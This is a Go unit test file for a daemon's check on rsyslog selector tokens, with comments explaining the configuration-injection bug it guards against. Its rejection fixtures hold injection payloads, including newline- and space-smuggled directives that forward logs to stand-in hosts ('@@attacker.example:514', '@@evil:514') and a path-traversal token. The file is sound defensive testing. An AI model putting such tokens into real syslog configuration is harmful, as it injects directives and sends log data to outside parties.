package daemon

import (
	"math/rand"
	"strings"
	"testing"
)

// #5797 invariant 7, render-belt half.
//
// syslogDropinContents builds an rsyslog selector line
// `<facility>.<severity>\t<target>` from config tokens and writes it to a
// managed drop-in under /etc/rsyslog.d. #4902 belted the file NAME and the
// user TOKEN on that exact line but left the two SELECTOR tokens unchecked, so
// a newline or an rsyslog metacharacter in a facility/severity escaped the
// selector and injected configuration. syslogSelectorTokenSafe closes that.
//
// SCOPE OF THIS FILE: it tests the PREDICATE in isolation, and that is not the
// same as testing the fix. The shipped protection is the two
// `if !syslogSelectorTokenSafe(...)` guards at the render site; every test
// here stays green if both are deleted. syslog_selector_render_5797_test.go
// is what binds those call sites — do not treat this file as covering them.
//
// The belt is a SHAPE check on purpose. Deciding which facility NAMES are
// honoured means reconciling the Junos vocabulary (`authorization`, `kernel`,
// `interactive-commands`) against the BSD/rsyslog names the runtime maps
// (`auth`, `kern`) — an operator-visible mapping change deferred on #5797.
// TestSyslogSelectorTokenAcceptsJunosVocabulary_5797 pins that the belt does
// NOT pre-empt that decision by rejecting names the runtime cannot yet map.

// TestSyslogSelectorTokenRejectsInjection_5797 is the fail-on-revert guard.
// Reverting either belt call site makes the corresponding destination render a
// drop-in built from these tokens.
func TestSyslogSelectorTokenRejectsInjection_5797(t *testing.T) {
	cases := []struct {
		name string
		tok  string
	}{
		// The primary vector: a newline ends the selector line and the rest is
		// parsed by rsyslog as its own directive.
		{"embedded newline", "daemon\n*.* @@attacker.example:514"},
		{"embedded CR", "daemon\r*.* /tmp/pwn"},
		// rsyslog statement / selector grammar.
		{"statement separator", "daemon;*.*"},
		{"selector dot", "daemon.info"},
		{"wildcard", "*"},
		{"colon action prefix", "daemon:omusrmsg:root"},
		{"comma facility list", "daemon,auth"},
		// Whitespace splits the selector from its action field.
		{"space", "daemon info"},
		{"tab", "daemon\tinfo"},
		// Control bytes.
		{"NUL", "daemon\x00"},
		{"DEL", "daemon\x7f"},
		// Path traversal in a token that reaches a written file's content.
		{"slash", "../../etc/passwd"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if syslogSelectorTokenSafe(c.tok) {
				t.Fatalf("selector token %q accepted as safe; it can escape the rsyslog "+
					"selector line and inject configuration (#5797)", c.tok)
			}
		})
	}
}

// TestSyslogSelectorTokenAcceptsJunosVocabulary_5797 is the over-rejection
// guard. It is the reason this belt is a shape check: it must accept every
// legitimate Junos facility/severity spelling — INCLUDING the Junos names the
// runtime does not yet map to a numeric facility — so the belt cannot silently
// pre-empt the deferred mapping decision by dropping valid destinations.
func TestSyslogSelectorTokenAcceptsJunosVocabulary_5797(t *testing.T) {
	safe := []string{
		// Empty: both call sites map it to the `*` wildcard, so it is ordinary
		// configuration rather than an omission.
		"",
		// Facilities the runtime maps today.
		"kern", "user", "daemon", "auth", "syslog", "change-log",
		"local0", "local1", "local2", "local3", "local4", "local5", "local6", "local7",
		// Junos facility names the runtime does NOT yet map. These must still
		// render — rejecting them here would turn a deferred mapping decision
		// into a silent loss of the destination.
		"authorization", "kernel", "interactive-commands", "conflict-log",
		"pfe", "security", "firewall", "external", "ftp", "ntp", "dfc",
		// Severities.
		"any", "none", "emergency", "alert", "critical",
		"error", "warning", "notice", "info", "debug",
		// Safe-shaped names that belong to NO vocabulary listed above, present
		// so a "hardcoded set of exactly the fixtures above" implementation
		// fails here. See TestSyslogSelectorTokenIsAShapeNotAList_5797 for the
		// form of that argument that a fixture cannot be added to.
		"audit-log", "local8", "vendor-specific-9",
	}
	for _, tok := range safe {
		if !syslogSelectorTokenSafe(tok) {
			t.Errorf("legitimate syslog selector token %q rejected — the belt is scoped "+
				"wider than the injection surface it guards", tok)
		}
	}
}

// TestSyslogSelectorTokenIsAShapeNotAList_5797 closes the blind spot the
// fixture list above cannot close on its own. Every name written into a fixture
// list becomes part of that list, so "accepts the Junos vocabulary" is equally
// satisfied by a hardcoded set containing exactly those names — an
// implementation that would then reject the next safe-shaped facility somebody
// configures, silently dropping their destination. That failure mode is this
// issue's own history: the accept set IS the decision.
//
// This pins the predicate as a SHAPE rather than a membership test, in the one
// form no fixture can be retrofitted into:
//
//   - exhaustively over all 256 byte values, accepted iff the byte is
//     [A-Za-z0-9-] — a set-membership implementation fails on the first
//     unlisted letter;
//   - over randomly generated safe-shaped tokens, which by construction are
//     not in any list a maintainer could have written.
//
// It is deliberately a restatement of the accept CLASS, because that class is
// the security decision: everything in it is inert inside an rsyslog selector,
// everything outside it can alter the line's structure.
func TestSyslogSelectorTokenIsAShapeNotAList_5797(t *testing.T) {
	const accepted = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-"

	for b := 0; b < 256; b++ {
		tok := string([]byte{byte(b)})
		want := strings.ContainsRune(accepted, rune(b))
		if got := syslogSelectorTokenSafe(tok); got != want {
			if want {
				t.Errorf("byte %#x (%q) rejected: the belt is a membership test, not a shape "+
					"check — the next safe-shaped facility an operator writes will be dropped", b, tok)
			} else {
				t.Errorf("byte %#x (%q) accepted: it can alter the structure of the rendered "+
					"rsyslog selector line", b, tok)
			}
		}
	}

	// Randomly generated safe-shaped tokens. Fixed seed: a failure is
	// reproducible, and the corpus is still outside any hand-written list.
	rng := rand.New(rand.NewSource(5797))
	for i := 0; i < 500; i++ {
		n := 1 + rng.Intn(24)
		var sb strings.Builder
		for j := 0; j < n; j++ {
			sb.WriteByte(accepted[rng.Intn(len(accepted))])
		}
		if tok := sb.String(); !syslogSelectorTokenSafe(tok) {
			t.Fatalf("generated safe-shaped token %q rejected — the belt cannot be a list of "+
				"known facility names; it must accept the whole [A-Za-z0-9-] shape", tok)
		}
	}
}

// TestSyslogSelectorTokenSpaceIsUnsafe_5797 pins the specific byte the
// reachability trace turned on. A literal newline cannot reach these tokens —
// the lexer normalizes \n and \t inside a quoted value to a SPACE — so the
// belt's value does not rest on newline rejection. It rests on rejecting the
// space, because the emitted line is `<facility>.<severity>\t<target>` and
// rsyslog's grammar is `<selector><whitespace><action>`: a space inside the
// token is what lets attacker-chosen text reach the ACTION position.
//
// If a future edit relaxes this to "printable ASCII" or "no control bytes",
// the belt still rejects newlines (which were never reachable) while admitting
// the space (which is), i.e. it would look correct and guard nothing. This
// test fails on exactly that relaxation.
func TestSyslogSelectorTokenSpaceIsUnsafe_5797(t *testing.T) {
	for _, tok := range []string{
		"daemon local7",
		"* @@collector.example:514",
		"info *.* @@evil:514",
		" ",
		"daemon ",
	} {
		if syslogSelectorTokenSafe(tok) {
			t.Errorf("token %q accepted: a SPACE separates the rsyslog selector from its "+
				"action, so this reaches the action position of a managed drop-in. The "+
				"newline this belt appears to guard is NOT reachable (the lexer folds it "+
				"to a space) — the space is the live byte (#5797)", tok)
		}
	}
}
